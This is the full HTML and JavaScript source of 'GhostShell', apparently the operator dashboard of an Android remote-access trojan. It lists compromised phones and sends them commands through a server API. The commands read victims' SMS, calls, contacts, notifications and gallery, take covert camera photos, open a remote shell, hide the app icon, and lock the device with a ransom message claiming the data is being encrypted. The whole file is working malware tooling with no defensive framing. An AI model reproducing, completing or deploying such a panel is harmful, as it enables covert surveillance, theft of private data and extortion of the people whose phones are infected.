<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostShell System</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* BASE SYSTEM STYLES */
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Share Tech Mono', monospace; }
        :root { 
            --bg: #050505; 
            --surface: #0a0a0a; 
            --surface-light: #111111;
            --primary: #00ff33;
            --primary-glow: rgba(0, 255, 51, 0.2);
            --danger: #ff003c;
            --text: #e0e0e0; 
            --dim: #557755; 
        }
        
        body { 
            background: var(--bg); 
            color: var(--text); 
            padding: 15px; 
            overflow-x: hidden; 
            background-image: linear-gradient(rgba(0, 255, 51, 0.03) 1px, transparent 1px),
            linear-gradient(90deg, rgba(0, 255, 51, 0.03) 1px, transparent 1px);
            background-size: 20px 20px;
        }

        /* LOADING SCREEN */
        #loading-screen {
            position: fixed; inset: 0; background: #000; z-index: 9999;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            transition: opacity 0.8s ease-out;
        }
        .pulse-logo {
            width: 140px; filter: drop-shadow(0 0 15px var(--primary));
            animation: pulse 2s infinite;
        }
        .sys-text {
            margin-top: 25px; color: var(--primary); font-size: 1.1rem;
            letter-spacing: 3px; animation: blink 1s infinite; text-align: center;
        }
        @keyframes pulse { 0% { transform: scale(0.95); opacity: 0.8; } 50% { transform: scale(1.05); opacity: 1; filter: drop-shadow(0 0 25px var(--primary)); } 100% { transform: scale(0.95); opacity: 0.8; } }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }

        /* LAYOUT */
        .app-container { max-width: 900px; margin: 0 auto; display: flex; flex-direction: column; gap: 20px; }
        .panel { 
            background: var(--surface); border: 1px solid var(--dim); border-radius: 4px; 
            padding: 20px; box-shadow: inset 0 0 20px rgba(0,0,0,0.8); position: relative;
        }
        .panel::before { 
            content:''; position:absolute; top:-1px; left:-1px; width:15px; height:15px;
            border-top: 2px solid var(--primary); border-left: 2px solid var(--primary);
        }

        /* HEADER */
        .header { display: flex; justify-content: space-between; align-items: center; background: #000; border-bottom: 1px solid var(--primary); }
        .header h1 { font-size: 1.3rem; color: var(--primary); text-shadow: 0 0 10px var(--primary-glow); text-transform: uppercase; letter-spacing: 1px; }
        .header-actions { display: flex; align-items: center; gap: 15px; }

        /* VIEWS */
        #dashboard-view { display: none; }

        /* DEVICE LIST */
        .device-item { 
            background: var(--surface-light); padding: 15px; border-radius: 4px; margin-bottom: 12px; 
            cursor: pointer; border: 1px solid #222; border-left: 4px solid #222;
            transition: all 0.2s ease; line-height: 1.5; 
        }
        .device-item:hover { border-color: var(--dim); border-left: 4px solid var(--primary); background: #162216; }
        .device-header { display:flex; justify-content: space-between; font-size: 1rem; margin-bottom: 5px; color: #fff; word-break: break-all; gap: 10px;}
        .device-sub { font-size: 0.8rem; color: var(--dim); display: flex; flex-wrap: wrap; gap: 10px; }
        .sys-title { color: var(--text); border-bottom: 1px dashed var(--dim); padding-bottom: 8px; margin-bottom: 15px; font-size: 0.95rem; letter-spacing: 1px;}

        /* DASHBOARD STATUS & GRID */
        .top-controls { display: flex; justify-content: space-between; align-items: center; gap: 10px; margin-bottom: 15px; }
        .status-bar { 
            display: flex; gap: 15px; background: #000; padding: 12px 15px; 
            border: 1px solid #222; border-radius: 4px; font-size: 0.85rem; flex: 1; word-break: break-all;
        }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; }
        
        /* BUTTONS */
        .btn { 
            background: #0a0a0a; border: 1px solid #333; border-radius: 4px; padding: 15px 5px; 
            text-align: center; color: var(--dim); cursor: pointer; font-size: 0.8rem; transition: 0.2s; 
        }
        .btn i { display: block; font-size: 1.5rem; margin-bottom: 8px; color: var(--primary); opacity: 0.8; }
        .btn:hover { border-color: var(--primary); color: var(--primary); box-shadow: inset 0 0 10px var(--primary-glow); }
        .btn:hover i { opacity: 1; text-shadow: 0 0 8px var(--primary); }
        .btn.active { border-color: var(--danger); color: var(--danger); }
        .btn.active i { color: var(--danger); }
        
        /* STEALTH TOGGLE STYLE */
        .btn.stealth-on { border-color: var(--primary); color: var(--primary); box-shadow: 0 0 10px var(--primary-glow); }
        .btn.stealth-on i { color: var(--primary); opacity: 1; }
        .status-badge { position: absolute; top: 5px; right: 5px; font-size: 0.6rem; padding: 2px 4px; background: #000; border: 1px solid #333; border-radius: 2px;}
        .stealth-on .status-badge { color: var(--primary); border-color: var(--primary); }
        
        button.action-btn { 
            background: transparent; color: var(--primary); font-weight: bold; border: 1px solid var(--primary); 
            padding: 8px 12px; border-radius: 2px; cursor: pointer; transition: 0.2s; text-transform: uppercase;
        }
        button.action-btn:hover { background: var(--primary); color: #000; box-shadow: 0 0 15px var(--primary-glow); }
        button.action-btn.red { border-color: var(--danger); color: var(--danger); }
        button.action-btn.red:hover { background: var(--danger); color: #000; box-shadow: 0 0 15px rgba(255,0,60,0.3); }

        /* MODAL & TERMINAL */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(3px); z-index: 100; align-items: center; justify-content: center; padding: 10px; }
        .modal-card { background: #050505; width: 100%; max-width: 850px; max-height: 90vh; border-radius: 4px; border: 1px solid var(--primary); display: flex; flex-direction: column; box-shadow: 0 0 30px rgba(0,255,51,0.1); }
        .modal-header { padding: 12px 15px; background: #0a0a0a; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #222; }
        .modal-body { padding: 15px; overflow-y: auto; flex: 1; font-size: 0.85rem; }
        .modal-footer { padding: 12px 15px; background: #0a0a0a; display: flex; gap: 8px; flex-wrap: wrap; border-top: 1px solid #222; }
        
        .terminal { 
            background: #000; color: var(--primary); padding: 12px; border-radius: 2px; 
            height: 300px; overflow-y: auto; border: 1px solid #222; margin-bottom: 10px; white-space: pre-wrap;
            box-shadow: inset 0 0 15px rgba(0,255,51,0.05); word-break: break-all;
        }
        
        /* TABLES & FORMS */
        .table-responsive { width: 100%; overflow-x: auto; display: block; }
        table { width: 100%; border-collapse: collapse; min-width: 400px; }
        th { color: var(--dim); border-bottom: 1px solid #333; padding: 8px; text-align: left; text-transform: uppercase; font-size: 0.75rem; white-space: nowrap;}
        td { padding: 8px; border-bottom: 1px solid #111; color: var(--text); font-size: 0.85rem; }
        input, textarea { background: #0a0a0a; border: 1px solid #333; padding: 10px; border-radius: 2px; color: var(--primary); width: 100%; outline: none; transition: 0.3s; }
        input:focus, textarea:focus { border-color: var(--primary); box-shadow: inset 0 0 5px var(--primary-glow); }
        
        .gal-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 8px; }
        .gal-item img { width: 100%; height: 90px; object-fit: cover; border-radius: 2px; border: 1px solid #333; }
        
        /* --- MOBILE RESPONSIVE TWEAKS --- */
        @media (max-width: 650px) {
            body { padding: 10px; }
            .panel { padding: 15px; }
            .header { flex-direction: column; align-items: flex-start; gap: 12px; padding: 15px; }
            .header-actions { width: 100%; justify-content: space-between; }
            
            .top-controls { flex-direction: column; align-items: stretch; }
            .status-bar { flex-direction: column; align-items: center; text-align: center; gap: 8px; padding: 10px; }
            
            .grid { grid-template-columns: repeat(2, 1fr); gap: 8px; }
            .btn { padding: 12px 5px; font-size: 0.75rem; }
            
            .modal-card { height: 95vh; }
            .modal-footer { flex-direction: column; align-items: stretch; }
            .modal-footer button { width: 100%; margin-bottom: 5px; }
            
            .terminal { height: 200px; font-size: 0.75rem; }
        }
    </style>
</head>
<body>
    <div id="loading-screen">
        <img src="https://i.ibb.co.com/Y7YpxtHt/logogs-removebg-preview.png" alt="GhostShell" class="pulse-logo">
        <div class="sys-text">SYSTEM INITIALIZING...</div>
    </div>

    <div class="app-container">
        <header class="panel header">
            <h1><i class="fas fa-terminal"></i> GhostShell_OS</h1>
            <div class="header-actions">
                <div style="color:var(--dim); font-size:0.85rem;">
                    [UID: <span id="user-display" style="color:var(--primary)"></span>]
                </div>
                <button onclick="logout()" class="action-btn red" style="font-size: 0.7rem; padding: 5px 10px;">DISCONNECT</button>
            </div>
        </header>

        <div id="selection-view" class="panel">
            <h3 class="sys-title"><i class="fas fa-satellite-dish"></i> DETECTED TARGETS</h3>
            <div id="device-list" style="margin-top: 15px;">
                <div style="color:var(--dim); text-align:center; padding: 20px 0;">Scanning network...</div>
            </div>
        </div>

        <div id="dashboard-view" class="panel">
            <div class="top-controls">
                <button onclick="backToSelection()" class="action-btn" style="border-color: #555; color: #ccc;">
                    <i class="fas fa-chevron-left"></i> BACK
                </button>
                <div class="status-bar">
                    <span>TARGET: <b id="sel-info" style="color:var(--primary);">None</b></span>
                    <span>LINK: <b id="conn-stat" style="color:var(--danger);">OFFLINE</b></span>
                </div>
            </div>
            
            <h3 class="sys-title" style="margin-top: 10px;"><i class="fas fa-microchip"></i> EXECUTE COMMAND</h3>
            <div class="grid" id="main-grid"></div>
        </div>
    </div>

    <div id="modal" class="modal">
        <div class="modal-card">
            <div class="modal-header">
                <h3 id="modal-title" style="color:var(--primary); text-transform: uppercase; font-size: 1.1rem;">MODAL</h3>
                <span style="cursor:pointer; font-size:1.5rem; color: var(--dim); padding: 0 10px;" onclick="closeModal()">&times;</span>
            </div>
            <div class="modal-body" id="modal-body"></div>
            <div class="modal-footer" id="modal-footer"></div>
        </div>
    </div>

    <script>
        // --- UI LOGIC MODIFICATIONS ---
        window.onload = () => {
            setTimeout(() => {
                const loader = document.getElementById('loading-screen');
                loader.style.opacity = '0';
                setTimeout(() => loader.style.display = 'none', 800);
            }, 2500); 
        };

        function selectTarget(id) {
            selId = id;
            document.getElementById('selection-view').style.display = 'none';
            document.getElementById('dashboard-view').style.display = 'block';
            updateMain();
        }

        function backToSelection() {
            selId = null;
            document.getElementById('dashboard-view').style.display = 'none';
            document.getElementById('selection-view').style.display = 'block';
        }

        // --- ORIGINAL SYSTEM LOGIC (UNTOUCHED) ---
        const myUid = localStorage.getItem('ghost_uid');
        if(!myUid) location.href = '/';
        document.getElementById('user-display').innerText = myUid;

        let state = { devices: [] }, selId = null, curMod = null, cache = {}, hash = "", termOut = "", flash = false, isStealth = false, mediaRecorder, audioChunks = [];

        async function cmd(c, b={}) {
            if(!selId) return;
            await fetch('/api/command', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cmd:c, client_id:selId, ...b})});
        }

        function toggleStealth(btn) {
            isStealth = !isStealth;
            cmd(isStealth ? 'hide_icon' : 'show_icon');
            btn.classList.toggle('stealth-on');
            btn.querySelector('.status-badge').innerText = isStealth ? 'ON' : 'OFF';
        }

        function logout() { localStorage.removeItem('ghost_uid'); location.href = '/'; }

        function openModal(t) {
            curMod = t; hash = "";
            document.getElementById('modal').style.display = 'flex';
            document.getElementById('modal-title').innerText = t.replace('_', ' ');
            const b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
            b.innerHTML = ""; f.innerHTML = "";

            if(t === 'filemanager') {
                termOut = "root@ghost_os:~# Establishing remote shell...\nroot@ghost_os:~# Shell Active.\n";
                b.innerHTML = `<div class="terminal" id="terminal">${termOut}</div><div style="display:flex; gap:10px; background:#000; padding:12px; border:1px solid #333; border-radius:2px;"><span style="color:var(--primary)">#</span><input id="term-in" style="background:transparent; border:none; color:var(--primary); outline:none; width:100%; padding:0;" autofocus onkeydown="if(event.key==='Enter') execShell()"></div>`;
                f.innerHTML = `<button class="action-btn" onclick="document.getElementById('up-file').click()">[+] UPLOAD FILE</button><input type="file" id="up-file" style="display:none" onchange="uploadShellFile(this)">`;
                cmd('filemanager'); return;
            } else if(t === 'panic') {
                b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">Duration (sec):</p><input type="number" id="psec" value="30"><p style="margin-top:15px; color:var(--dim); margin-bottom:5px;">Hell Message:</p><textarea id="pmsg" style="height:100px;">YOU ARE HACKED!</textarea>`;
                f.innerHTML = `<button class="action-btn red" onclick="cmd('panic '+document.getElementById('psec').value+'|'+document.getElementById('pmsg').value.replace(/\\n/g,'<br>'))">EXECUTE HELL</button><button class="action-btn" onclick="cmd('stop_panic')">ABORT</button>`;
                return;
            } else if(t === 'voice') {
                b.innerHTML = `<div style="text-align:center; padding:30px;"><i id="v-icon" class="fas fa-microphone" style="font-size:4rem; color:var(--dim); margin-bottom:15px;"></i><p id="v-stat" style="color:var(--primary)">Awaiting Input...</p></div>`;
                f.innerHTML = `<button id="v-start" class="action-btn" onclick="startRec()">START RECORDING</button><button id="v-stop" onclick="stopRec()" style="display:none;" class="action-btn red">STOP & TRANSMIT</button>`;
                return;
            } else if(t === 'setwallpaper') {
                b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">Upload Local:</p><input type="file" onchange="uploadWall(this)"><p style="margin-top:15px; color:var(--dim); margin-bottom:5px;">Inject URL:</p><input id="wurl" placeholder="https://domain.com/img.jpg">`;
                f.innerHTML = `<button class="action-btn" onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY PAYLOAD</button>`;
                return;
            } else if(t === 'toast') {
                b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">System Message:</p><textarea id="lmsg" style="height:100px;">SYSTEM CRITICAL ERROR\\nYour data is being encrypted.</textarea><p style="margin-top:15px; color:var(--dim); margin-bottom:5px;">Unlock PIN:</p><input id="lpin" value="1337" style="text-align:center; font-size:1.5rem; letter-spacing: 5px;">`;
                f.innerHTML = `<button class="action-btn red" onclick="cmd('lock '+document.getElementById('lmsg').value.replace(/\\n/g, '<br>')+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><button class="action-btn" onclick="cmd('unlock')">FORCE UNLOCK</button>`;
                return;
            } else if(t === 'vibrate') {
                b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">Duration (Seconds):</p><input type="number" id="vsec" value="5">`;
                f.innerHTML = `<button class="action-btn" onclick="cmd('vibrate '+document.getElementById('vsec').value)">EXECUTE</button>`;
                return;
            } else if(t === 'open_url') {
                b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">Target URL:</p><input id="ourl" value="https://google.com">`;
                f.innerHTML = `<button class="action-btn" onclick="cmd('openurl '+document.getElementById('ourl').value)">FORCE OPEN</button>`;
                return;
            }

            const map = { sms:'getsms', calls:'getcalllogs', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic', contacts:'getcontacts', info:'deviceinfo', gallery:'gallery' };
            if(map[t]) cmd(map[t]);
            render();
        }

        function execShell() {
            const inp = document.getElementById('term-in'); if(!inp.value.trim()) return;
            cmd(inp.value.trim()); termOut += `# ${inp.value}\n`;
            document.getElementById('terminal').innerText = termOut; inp.value = "";
        }

        async function startRec() {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(stream); audioChunks = [];
            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
            mediaRecorder.onstop = sendAudio; mediaRecorder.start();
            document.getElementById('v-icon').style.color = 'var(--danger)'; document.getElementById('v-stat').innerText = '[ RECORDING IN PROGRESS ]';
            document.getElementById('v-start').style.display = 'none'; document.getElementById('v-stop').style.display = 'block';
        }
        function stopRec() { mediaRecorder.stop(); }
        async function sendAudio() {
            const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
            const formData = new FormData(); formData.append('file', audioBlob);
            const res = await fetch('/api/upload_voice', { method: 'POST', body: formData });
            const data = await res.json();
            if(data.status === 'ok') cmd('play_voice ' + window.location.origin + '/captured_images/' + data.filename);
            setTimeout(closeModal, 1500);
        }

        async function uploadWall(input) {
            const formData = new FormData(); formData.append('file', input.files[0]);
            const res = await fetch('/api/upload_wallpaper', {method:'POST', body:formData});
            const data = await res.json();
            if(data.status === 'ok') cmd('set_wallpaper ' + window.location.origin + '/captured_images/' + data.filename);
        }

        async function uploadShellFile(input) {
            const formData = new FormData(); formData.append('file', input.files[0]);
            const res = await fetch('/api/upload_wallpaper', {method:'POST', body:formData});
            const data = await res.json();
            if(data.status === 'ok') cmd(`upload ${btoa(data.filename)} ${btoa(window.location.origin + '/captured_images/' + data.filename)}`);
        }

        function closeModal() { if(curMod === 'gallery') cmd('exit_gallery'); if(curMod === 'filemanager') cmd('exit_shell'); document.getElementById('modal').style.display = 'none'; curMod = null; }

        function render() {
            if(!curMod || !selId || !cache[selId]) return;
            const d = cache[selId], b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
            if(curMod === 'filemanager') {
                const fm = d.fm; if(hash === JSON.stringify(fm)) return; hash = JSON.stringify(fm);
                let out = `Path: ${fm.path}\n\n`;
                fm.files.forEach(x => out += `${x.isDirectory?'[DIR] ':'[FILE]'} ${x.name}\n`);
                termOut += out; document.getElementById('terminal').innerText = termOut;
                document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight; return;
            }
            if(['panic', 'vibrate', 'open_url', 'setwallpaper', 'voice', 'toast'].includes(curMod)) return;
            const curHash = JSON.stringify(d[curMod] || d.info || d.media || d.notifications || "");
            if(hash === curHash) return; hash = curHash;
            b.innerHTML = "";

            // Tabel dibungkus .table-responsive biar bisa di-scroll ke samping di HP
            if(curMod === 'info') {
                const i = d.info;
                b.innerHTML = `<div class="table-responsive"><table><tr><td>Model</td><td>${i.Model}</td></tr><tr><td>Vendor</td><td>${i.Manufacturer}</td></tr><tr><td>OS Base</td><td>Android ${i.AndroidVersion}</td></tr><tr><td>Location</td><td>${i.Country}</td></tr><tr><td>Power</td><td>${i.Battery}</td></tr><tr><td>Network</td><td>${i.WiFi}</td></tr><tr><td>SIM_1</td><td>${i.SIM1 || 'NULL'}</td></tr><tr><td>SIM_2</td><td>${i.SIM2 || 'NULL'}</td></tr><tr><td>Phone_No</td><td>${i.PhoneNumber}</td></tr></table></div>`;
            } else if(curMod === 'apps') {
                b.innerHTML = `<div class="table-responsive"><table><tr><th>Package Name</th><th>Execute</th></tr>${d.apps.map(a=>`<tr><td><b style="color:var(--text)">${a.appName}</b><br><small style="color:var(--dim)">${a.packageName}</small></td><td style="text-align:right;"><button class="action-btn" style="padding:5px 10px; font-size:0.7rem; margin-right:5px;" onclick="cmd('run ${a.packageName}')">RUN</button><button class="action-btn red" style="padding:5px 10px; font-size:0.7rem;" onclick="cmd('uninstall ${a.packageName}')">DEL</button></td></tr>`).join('')}</table></div>`;
            } else if(curMod === 'sms') {
                b.innerHTML = `<div class="table-responsive"><table><tr><th>Target/Sender</th><th>Payload</th></tr>${d.sms.map(l=>`<tr><td style="color:var(--primary)">${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table></div>`;
            } else if(curMod === 'calls') {
                b.innerHTML = `<div class="table-responsive"><table><tr><th>Identifier</th><th>Time (Sec)</th></tr>${d.calls.map(l=>`<tr><td style="color:var(--primary)">${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table></div>`;
            } else if(curMod === 'contacts') {
                b.innerHTML = `<div class="table-responsive"><table><tr><th>Entity Name</th><th>Route Number</th></tr>${d.contacts.map(c=>`<tr><td>${c.name}</td><td style="color:var(--primary)">${c.number}</td></tr>`).join('')}</table></div>`;
            } else if(curMod === 'gallery') {
                b.innerHTML = `<div class="gal-grid">${d.gallery.files.map(x=>`<div class="gal-item"><img src="data:image/jpeg;base64,${x.thumbnail}"/><p style="font-size:0.6rem; margin-top:5px; color:var(--dim); word-break:break-all;">${x.name}</p></div>`).join('')}</div>`;
                f.innerHTML = `<div style="display:flex; justify-content:space-between; width:100%; align-items:center;"><button class="action-btn" onclick="cmd('gallery back')"><i class="fas fa-chevron-left"></i></button><span style="color:var(--primary); font-weight:bold; font-size:0.9rem;">PAGE: ${d.gallery.page}</span><button class="action-btn" onclick="cmd('gallery next')"><i class="fas fa-chevron-right"></i></button></div>`;
            } else if(curMod.includes('pic')) {
                const media = d.media;
                if(media.status === 'done' && media.last_img) {
                    b.innerHTML = `<div style="text-align:center;"><img src="/captured_images/${media.last_img}?t=${Date.now()}" style="width:100%; max-width: 500px; border-radius:2px; border:1px solid var(--primary); box-shadow:0 0 15px rgba(0,255,51,0.2);"></div>`;
                } else {
                    b.innerHTML = `<div style="color:var(--primary)">STATUS: ${media.status || 'CAPTURING...'}</div>`;
                }
            } else if(curMod === 'notifications') {
                b.innerHTML = `<div class="table-responsive"><table><tr><th>Source</th><th>Content</th></tr>${d.notifications.map(n=>`<tr><td style="color:var(--primary); font-size:0.8rem;">${n.packageName}</td><td><b style="color:var(--text)">${n.title}</b><br><span style="color:var(--dim)">${n.text}</span></td></tr>`).join('')}</table></div>`;
                f.innerHTML = `<button class="action-btn" style="width:100%" onclick="cmd('getnotifications')">REFRESH DATA</button>`;
            }
        }

        async function poll() {
            try {
                const res = await fetch(`/api/status?owner=${myUid}`);
                state = await res.json();
                
                document.getElementById('device-list').innerHTML = state.devices.map(d=>`
                    <div class="device-item" onclick="selectTarget('${d.id}')">
                        <div class="device-header">
                            <span><i class="fas fa-mobile-screen" style="color:var(--primary); margin-right:8px;"></i> ${d.model}</span>
                            <span style="color:var(--primary); font-size:0.85rem; margin-top:2px;">[ ACTIVE ]</span>
                        </div>
                        <div class="device-sub">
                            <span>OS: AND ${d.ver}</span>
                            <span>LOC: ${d.cnt}</span>
                            <span style="color:var(--primary)">PWR: ${d.bat}</span>
                        </div>
                    </div>
                `).join('') || "<div style='color:var(--dim); font-style:italic; text-align:center; padding: 20px 0;'>No active endpoints found on network...</div>";
                
                if(selId) {
                    const dres = await fetch(`/api/data/${selId}`);
                    cache[selId] = await dres.json(); if(curMod) render();
                }
            } catch(e){}
            setTimeout(poll, 3000);
        }

        function toggleFlash(btn) { flash = !flash; cmd(flash?'flashon':'flashoff'); btn.classList.toggle('active'); }

        function updateMain() {
            document.getElementById('sel-info').innerText = selId || "None";
            const e = !!selId;
            document.getElementById('conn-stat').innerText = e ? "ESTABLISHED":"DISCONNECTED";
            document.getElementById('conn-stat').style.color = e ? "var(--primary)":"var(--danger)";
            const btns = [
                {id:'filemanager', i:'fa-terminal', l:'SYS SHELL'}, {id:'info', i:'fa-server', l:'SYS INFO'},
                {id:'panic', i:'fa-skull-crossbones', l:'HELL LOCK'}, {id:'contacts', i:'fa-address-book', l:'CONTACTS'},
                {id:'sms', i:'fa-comment-sms', l:'INTERCEPT'}, {id:'calls', i:'fa-phone-volume', l:'CALL LOGS'},
                {id:'gallery', i:'fa-images', l:'GALLERY'}, {id:'notifications', i:'fa-bell', l:'NOTIFS'},
                {id:'apps', i:'fa-box-archive', l:'PACKAGES'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
                {id:'vibrate', i:'fa-wave-square', l:'VIBRATE'}, {id:'voice', i:'fa-microphone-lines', l:'MIC INJECT'},
                {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
                {id:'stealth', i:'fa-eye-slash', l:'STEALTH', type:'stealth'},
                {id:'setwallpaper', i:'fa-image', l:'DEFACE WP'}, {id:'toast', i:'fa-lock', l:'RANSOM'},
                {id:'open_url', i:'fa-globe', l:'FORCE URL'}
            ];
            document.getElementById('main-grid').innerHTML = btns.map(b=>{
                if(b.type === 'stealth') return `<div class="btn ${isStealth?'stealth-on':''}" onclick="toggleStealth(this)"><span class="status-badge">${isStealth?'ON':'OFF'}</span><i class="fas ${b.i}"></i>${b.l}</div>`;
                return `<div class="btn ${b.id==='flash'&&flash?'active':''}" onclick="${b.id==='flash'?'toggleFlash(this)':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`;
            }).join('');
        }
        poll();
    </script>
</body>
</html>
